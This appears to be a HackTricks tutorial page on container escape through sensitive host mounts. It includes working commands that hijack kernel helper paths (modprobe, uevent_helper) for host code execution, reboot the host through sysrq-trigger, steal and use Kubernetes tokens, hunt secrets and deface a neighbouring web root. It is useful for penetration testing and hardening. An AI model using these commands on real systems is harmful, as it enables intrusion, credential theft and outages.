_body: "# Sensitive Host Mounts\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Overview\n\nHost mounts are\
  \ one of the most important practical container-escape surfaces because they often collapse a carefully isolated process\
  \ view back into direct visibility of host resources. The dangerous cases are not limited to `/`. Bind mounts of `/proc`,\
  \ `/sys`, `/var`, runtime sockets, kubelet-managed state, or device-related paths can expose kernel controls, credentials,\
  \ neighboring container filesystems, and runtime management interfaces.\n\nThis page exists separately from the individual\
  \ protection pages because the abuse model is cross-cutting. A writable host mount is dangerous partly because of mount\
  \ namespaces, partly because of user namespaces, partly because of AppArmor or SELinux coverage, and partly because of what\
  \ exact host path was exposed. Treating it as its own topic makes the attack surface much easier to reason about.\n\n##\
  \ `/proc` Exposure\n\nprocfs contains both ordinary process information and high-impact kernel control interfaces. A bind\
  \ mount such as `-v /proc:/host/proc` or a container view that exposes unexpected writable proc entries can therefore lead\
  \ to information disclosure, denial of service, or direct host code execution.\n\nHigh-value procfs paths include:\n\n-\
  \ `/proc/sys/kernel/core_pattern`\n- `/proc/sys/kernel/modprobe`\n- `/proc/sys/vm/panic_on_oom`\n- `/proc/sys/fs/binfmt_misc`\n\
  - `/proc/config.gz`\n- `/proc/sysrq-trigger`\n- `/proc/kmsg`\n- `/proc/kallsyms`\n- `/proc/[pid]/mem`\n- `/proc/kcore`\n\
  - `/proc/kmem`\n- `/proc/mem`\n- `/proc/sched_debug`\n- `/proc/[pid]/mountinfo`\n\n### Abuse\n\nStart by checking which\
  \ high-value procfs entries are visible or writable:\n\n```bash\nfor p in \\\n  /proc/sys/kernel/core_pattern \\\n  /proc/sys/kernel/modprobe\
  \ \\\n  /proc/sysrq-trigger \\\n  /proc/kmsg \\\n  /proc/kallsyms \\\n  /proc/kcore \\\n  /proc/sched_debug \\\n  /proc/1/mountinfo\
  \ \\\n  /proc/config.gz; do\n  [ -e \"$p\" ] && ls -l \"$p\"\ndone\n```\n\nThese paths are interesting for different reasons.\
  \ `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`,\
  \ `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal\
  \ process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.\n\nThe practical\
  \ value of each path is different, and treating them all as if they had the same impact makes triage harder:\n\n- `/proc/sys/kernel/core_pattern`\n\
  \  If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash.\
  \ A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain\
  \ host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.\n- `/proc/sys/kernel/modprobe`\n\
  \  This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable\
  \ from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially\
  \ interesting when combined with a way to trigger the helper path.\n- `/proc/sys/vm/panic_on_oom`\n  This is not usually\
  \ a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions\
  \ into kernel panic behavior.\n- `/proc/sys/fs/binfmt_misc`\n  If the registration interface is writable, the attacker may\
  \ register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.\n- `/proc/config.gz`\n\
  \  Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are\
  \ enabled without needing host package metadata.\n- `/proc/sysrq-trigger`\n  Mostly a denial-of-service path, but a very\
  \ serious one. It can reboot, panic, or otherwise disrupt the host immediately.\n- `/proc/kmsg`\n  Reveals kernel ring buffer\
  \ messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to\
  \ kernel exploitation.\n- `/proc/kallsyms`\n  Valuable when readable because it exposes exported kernel symbol information\
  \ and may help defeat address randomization assumptions during kernel exploit development.\n- `/proc/[pid]/mem`\n  This\
  \ is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it\
  \ may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`,\
  \ Yama, and ptrace restrictions, so it is a powerful but conditional path.\n- `/proc/kcore`\n  Exposes a core-image-style\
  \ view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed\
  \ host memory surface.\n- `/proc/kmem` and `/proc/mem`\n  Historically high-impact raw memory interfaces. On many modern\
  \ systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.\n\
  - `/proc/sched_debug`\n  Leaks scheduling and task information that may expose host process identities even when other process\
  \ views look cleaner than expected.\n- `/proc/[pid]/mountinfo`\n  Extremely useful for reconstructing where the container\
  \ really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or\
  \ only to the container layer.\n\nIf `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host\
  \ path of the container filesystem:\n\n```bash\ncat /proc/self/mountinfo | head -n 50\nmount | grep overlay\n```\n\nThese\
  \ commands are useful because a number of host-execution tricks require turning a path inside the container into the corresponding\
  \ path from the host's point of view.\n\n### Full Example: `modprobe` Helper Path Abuse\n\nIf `/proc/sys/kernel/modprobe`\
  \ is writable from the container and the helper path is interpreted in the host context, it can be redirected to an attacker-controlled\
  \ payload:\n\n```bash\n[ -w /proc/sys/kernel/modprobe ] || exit 1\nhost_path=$(mount | sed -n 's/.*upperdir=\\([^,]*\\).*/\\\
  1/p' | head -n1)\ncat <<'EOF' > /tmp/modprobe-payload\n#!/bin/sh\nid > /tmp/modprobe.out\nEOF\nchmod +x /tmp/modprobe-payload\n\
  echo \"$host_path/tmp/modprobe-payload\" > /proc/sys/kernel/modprobe\ncat /proc/sys/kernel/modprobe\n```\n\nThe exact trigger\
  \ depends on the target and kernel behavior, but the important point is that a writable helper path can redirect a future\
  \ kernel helper invocation into attacker-controlled host-path content.\n\n### Full Example: Kernel Recon With `kallsyms`,\
  \ `kmsg`, And `config.gz`\n\nIf the goal is exploitability assessment rather than immediate escape:\n\n```bash\nhead -n\
  \ 20 /proc/kallsyms 2>/dev/null\ndmesg 2>/dev/null | head -n 50\nzcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES'\
  \ | head -n 50\n```\n\nThese commands help answer whether useful symbol information is visible, whether recent kernel messages\
  \ reveal interesting state, and which kernel features or mitigations are compiled in. The impact is usually not direct escape,\
  \ but it can sharply shorten kernel-vulnerability triage.\n\n### Full Example: SysRq Host Reboot\n\nIf `/proc/sysrq-trigger`\
  \ is writable and reaches the host view:\n\n```bash\necho b > /proc/sysrq-trigger\n```\n\nThe effect is immediate host reboot.\
  \ This is not a subtle example, but it clearly demonstrates that procfs exposure can be far more serious than information\
  \ disclosure.\n\n## `/sys` Exposure\n\nsysfs exposes large amounts of kernel and device state. Some sysfs paths are mainly\
  \ useful for fingerprinting, while others can affect helper execution, device behavior, security-module configuration, or\
  \ firmware state.\n\nHigh-value sysfs paths include:\n\n- `/sys/kernel/uevent_helper`\n- `/sys/class/thermal`\n- `/sys/kernel/vmcoreinfo`\n\
  - `/sys/kernel/security`\n- `/sys/firmware/efi/vars`\n- `/sys/firmware/efi/efivars`\n- `/sys/kernel/debug`\n\nThese paths\
  \ matter for different reasons. `/sys/class/thermal` can influence thermal-management behavior and therefore host stability\
  \ in badly exposed environments. `/sys/kernel/vmcoreinfo` can leak crash-dump and kernel-layout information that helps with\
  \ low-level host fingerprinting. `/sys/kernel/security` is the `securityfs` interface used by Linux Security Modules, so\
  \ unexpected access there may expose or alter MAC-related state. EFI variable paths can affect firmware-backed boot settings,\
  \ making them much more serious than ordinary configuration files. `debugfs` under `/sys/kernel/debug` is especially dangerous\
  \ because it is intentionally a developer-oriented interface with far fewer safety expectations than hardened production-facing\
  \ kernel APIs.\n\nUseful review commands for these paths are:\n\n```bash\nfind /sys/kernel/security -maxdepth 3 -type f\
  \ 2>/dev/null | head -n 50\nfind /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50\nfind /sys/firmware/efi\
  \ -maxdepth 3 -type f 2>/dev/null | head -n 50\nfind /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50\ncat\
  \ /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20\n```\n\nWhat makes those commands interesting:\n\n- `/sys/kernel/security`\
  \ may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.\n\
  - `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable,\
  \ expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.\n- EFI variable exposure is less\
  \ common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.\n\
  - `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.\n\
  - `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level\
  \ kernel state.\n\n### Full Example: `uevent_helper`\n\nIf `/sys/kernel/uevent_helper` is writable, the kernel may execute\
  \ an attacker-controlled helper when a `uevent` is triggered:\n\n```bash\ncat <<'EOF' > /evil-helper\n#!/bin/sh\nid > /output\n\
  EOF\nchmod +x /evil-helper\nhost_path=$(mount | sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' | head -n1)\necho \"$host_path/evil-helper\"\
  \ > /sys/kernel/uevent_helper\necho change > /sys/class/mem/null/uevent\ncat /output\n```\n\nThe reason this works is that\
  \ the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather\
  \ than inside the current container.\n\n## `/var` Exposure\n\nMounting the host's `/var` into a container is often underestimated\
  \ because it does not look as dramatic as mounting `/`. In practice it can be enough to reach runtime sockets, container\
  \ snapshot directories, kubelet-managed pod volumes, projected service-account tokens, and neighboring application filesystems.\
  \ On modern nodes, `/var` is often where the most operationally interesting container state actually lives.\n\n### Kubernetes\
  \ Example\n\nA pod with `hostPath: /var` can often read other pods' projected tokens and overlay snapshot content:\n\n```bash\n\
  find /host-var/ -type f -iname '*.env*' 2>/dev/null\nfind /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io\n\
  cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null\n```\n\nThese commands\
  \ are useful because they answer whether the mount exposes only dull application data or high-impact cluster credentials.\
  \ A readable service-account token may immediately turn local code execution into Kubernetes API access.\n\nIf the token\
  \ is present, validate what it can reach instead of stopping at token discovery:\n\n```bash\nTOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token\
  \ 2>/dev/null)\ncurl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api\n```\n\nThe impact here\
  \ may be much larger than local node access. A token with broad RBAC can turn a mounted `/var` into cluster-wide compromise.\n\
  \n### Docker And containerd Example\n\nOn Docker hosts the relevant data is often under `/var/lib/docker`, while on containerd-backed\
  \ Kubernetes nodes it may be under `/var/lib/containerd` or snapshotter-specific paths:\n\n```bash\ndocker info 2>/dev/null\
  \ | grep -i 'docker root\\\\|storage driver'\nfind /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head\
  \ -n 50\nfind /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50\n```\n\nIf the mounted `/var`\
  \ exposes writable snapshot contents of another workload, the attacker may be able to alter application files, plant web\
  \ content, or change startup scripts without touching the current container configuration.\n\nConcrete abuse ideas once\
  \ writable snapshot content is found:\n\n```bash\necho '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html\
  \ 2>/dev/null\ngrep -Rni 'JWT_SECRET\\\\|TOKEN\\\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50\nfind /host-var/lib\
  \ -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20\n```\n\nThese commands are useful because\
  \ they show the three main impact families of mounted `/var`: application tampering, secret recovery, and lateral movement\
  \ into neighboring workloads.\n\n## Runtime Sockets\n\nSensitive host mounts often include runtime sockets rather than full\
  \ directories. These are so important that they deserve explicit repetition here:\n\n```text\n/run/containerd/containerd.sock\n\
  /var/run/crio/crio.sock\n/run/podman/podman.sock\n/run/buildkit/buildkitd.sock\n/var/run/kubelet.sock\n/run/firecracker-containerd.sock\n\
  ```\n\nSee [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) for full exploitation flows once one\
  \ of these sockets is mounted.\n\nAs a quick first interaction pattern:\n\n```bash\ndocker -H unix:///host/run/docker.sock\
  \ version 2>/dev/null\nctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null\ncrictl --runtime-endpoint\
  \ unix:///host/var/run/crio/crio.sock ps 2>/dev/null\n```\n\nIf one of these succeeds, the path from \"mounted socket\"\
  \ to \"start a more privileged sibling container\" is usually much shorter than any kernel breakout path.\n\n## Mount-Related\
  \ CVEs\n\nHost mounts also intersect with runtime vulnerabilities. Important recent examples include:\n\n- `CVE-2024-21626`\
  \ in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.\n- `CVE-2024-23651`\
  \ and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.\n- `CVE-2024-1753`\
  \ in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.\n- `CVE-2024-40635`\
  \ in containerd, where a large `User` value could overflow into UID 0 behavior.\n\nThese CVEs matter here because they show\
  \ that mount handling is not only about operator configuration. The runtime itself may also introduce mount-driven escape\
  \ conditions.\n\n## Checks\n\nUse these commands to locate the highest-value mount exposures quickly:\n\n```bash\nmount\n\
  find / -maxdepth 3 \\( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \\) -type d 2>/dev/null | head -n 100\nfind /\
  \ -maxdepth 4 \\( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock\
  \ \\) 2>/dev/null\nfind /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50\nfind /sys -maxdepth 4 -writable 2>/dev/null\
  \ | head -n 50\n```\n\nWhat is interesting here:\n\n- Host root, `/proc`, `/sys`, `/var`, and runtime sockets are all high-priority\
  \ findings.\n- Writable proc/sys entries often mean the mount is exposing host-global kernel controls rather than a safe\
  \ container view.\n- Mounted `/var` paths deserve credential and neighboring-workload review, not just filesystem review.\n\
